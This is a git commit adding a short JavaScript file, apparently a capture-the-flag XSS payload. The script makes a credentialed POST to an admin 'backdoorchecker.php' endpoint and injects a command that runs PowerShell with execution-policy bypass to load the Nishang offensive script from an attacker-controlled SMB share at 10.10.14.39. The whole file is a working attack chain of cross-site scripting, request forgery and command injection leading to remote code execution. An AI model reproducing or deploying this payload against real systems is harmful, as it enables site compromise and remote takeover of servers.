e5356702744962c88957f2fee9765da5a1476d2b
redhoodie09 <53815409+redhoodie09@users.noreply.github.com>
2020-06-19 20:35:41 +1000

    Create xss.js

---
+++ XSS/xss.js
@@ -0,0 +1,8 @@
+var xhr = new XMLHttpRequest();
+var url = "http://localhost/admin/backdoorchecker.php";
+var params = "cmd=dir | powershell -exec bypass -f \\\\10.10.14.39\\Red\\nishang.ps1";
+xhr.open("POST", url);
+xhr.setRequestHeader('Content-Type', 'Application/x-www-form-urlencoded');
+xhr.withCredentials = true;
+xhr.send(params);
+
